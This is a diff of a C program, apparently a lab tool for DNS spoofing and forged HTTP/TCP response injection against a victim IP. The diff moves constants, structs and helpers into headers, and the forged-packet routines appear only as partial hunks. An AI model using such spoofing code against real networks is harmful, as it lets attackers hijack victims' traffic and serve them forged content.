@@ -1,3 +1,4 @@
+// Libraries
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -12,106 +13,14 @@
 #include <pthread.h>
 #include <netinet/udp.h>
 
-#define PORT 9090
-#define BUFFER_SIZE 1024
-#define CLIENT_PORT 8081
-#define LOCAL_SERVER_HOST "172.20.0.104"
-#define VICTIM_IP "172.20.0.102"
-#define INDEX_HTML_PATH "./index.html"
-#define MAX_HTML_SIZE 4096
-#define HTTP_PORT 80
+// Constants
+#include "common.h"
+#include "utils.h"
 
-// HTTP response template
-#define FAKE_RESPONSE "HTTP/1.1 200 OK\r\n" \
-    "Content-Type: text/html\r\n" \
-    "Content-Length: %lu\r\n" \
-    "Connection: close\r\n\r\n%s"
-
-// Structure to store connection details
-struct conn_info {
-    uint32_t seq;
-    uint32_t ack;
-    uint16_t sport;
-    uint16_t dport;
-    uint16_t window;
-    uint8_t flags;
-};
-
-// Structure to store DNS details
-struct dns_info {
-    uint16_t txid;
-    char query[256];
-    uint16_t src_port;
-};
-
-// Add DNS header struct definition
-struct dns_header {
-    uint16_t id;       // Transaction ID
-    uint16_t flags;    // Flags
-    uint16_t qdcount;  // Question count
-    uint16_t ancount;  // Answer count 
-    uint16_t nscount;  // Authority count
-    uint16_t arcount;  // Additional count
-};
-
-// Add these declarations after the struct definitions and before any functions
-struct dns_info;  // Forward declaration of struct
-void send_dns_response(struct dns_info *dns);  // Function prototype
-
-// Add after struct definitions, before other functions
-// Function to calculate checksums for IP/UDP headers
-unsigned short calculate_checksum(unsigned short *buffer, int size) {
-    unsigned long sum = 0;
-    while (size > 1) {
-        sum += *buffer++;
-        size -= 2;
-    }
-    if (size) {
-        sum += *(unsigned char*)buffer;
-    }
-    sum = (sum >> 16) + (sum & 0xFFFF);
-    sum += (sum >> 16);
-    return (unsigned short)(~sum);
-}
-
-// Function to read HTML file
-char* read_html_file() {
-    static char html_content[MAX_HTML_SIZE];
-    FILE *fp = fopen(INDEX_HTML_PATH, "r");
-    if (!fp) {
-        printf("Error opening index.html: %s\n", strerror(errno));
-        return NULL;
-    }
-    
-    size_t bytes_read = fread(html_content, 1, MAX_HTML_SIZE - 1, fp);
-    fclose(fp);
-    
-    if (bytes_read == 0) {
-        printf("Error reading index.html\n");
-        return NULL;
-    }
-    
-    html_content[bytes_read] = '\0';
-    return html_content;
-}
-
-void error(const char *msg) {
-    perror(msg);
-    exit(1);
-}
-
-void debug_log(const char *format, ...) {
-    va_list args;
-    va_start(args, format);
-    time_t now = time(NULL);
-    char timestamp[64];
-    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
-    printf("[DEBUG %s] ", timestamp);
-    vprintf(format, args);
-    printf("\n");
-    fflush(stdout);
-    va_end(args);
-}
+// Forward declare functions at the top
+void send_dns_response(struct dns_info *dns);
+void send_fake_response(const char *response, const char *victim_ip, struct conn_info *conn);
+void handle_victim_request(const char *buffer, struct sockaddr_in *clientaddr, socklen_t len, int sockfd);
 
 void send_fake_response(const char *response, const char *victim_ip, struct conn_info *conn) {
     printf("\n=== Building HTTP Response Packet ===\n");
@@ -273,7 +182,6 @@ void handle_victim_request(const char *buffer, struct sockaddr_in *clientaddr, s
     fflush(stdout);  // Force output to show immediately
 }
 
-// Function to create DNS response packet
 void send_dns_response(struct dns_info *dns) {
     printf("\n[DNS] Creating DNS response for query: %s\n", dns->query);
 
@@ -377,7 +285,6 @@ void send_dns_response(struct dns_info *dns) {
     close(sd);
 }
 
-// Add TCP server thread function
 void *handle_http_server(void *arg) {
     printf("[HTTP] Starting HTTP server...\n");
     
